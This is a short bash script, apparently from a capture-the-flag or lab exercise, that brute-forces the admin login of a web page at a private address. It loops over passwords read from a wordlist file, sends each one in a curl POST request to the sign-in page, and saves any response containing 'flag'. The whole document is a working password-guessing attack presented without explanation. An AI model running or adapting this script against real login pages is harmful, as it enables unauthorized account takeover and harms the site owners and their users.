#!/bin/bash

PASSWORD_FILE="collection.txt"
URL="http://192.168.56.101/index.php?page=signin"

for password in $(cat "$PASSWORD_FILE"); do
    echo "Trying: $password"
    curl -s -X POST "$URL&username=admin&password=$password&Login=Login#" | grep 'flag' >> line_with_flag.txt
done
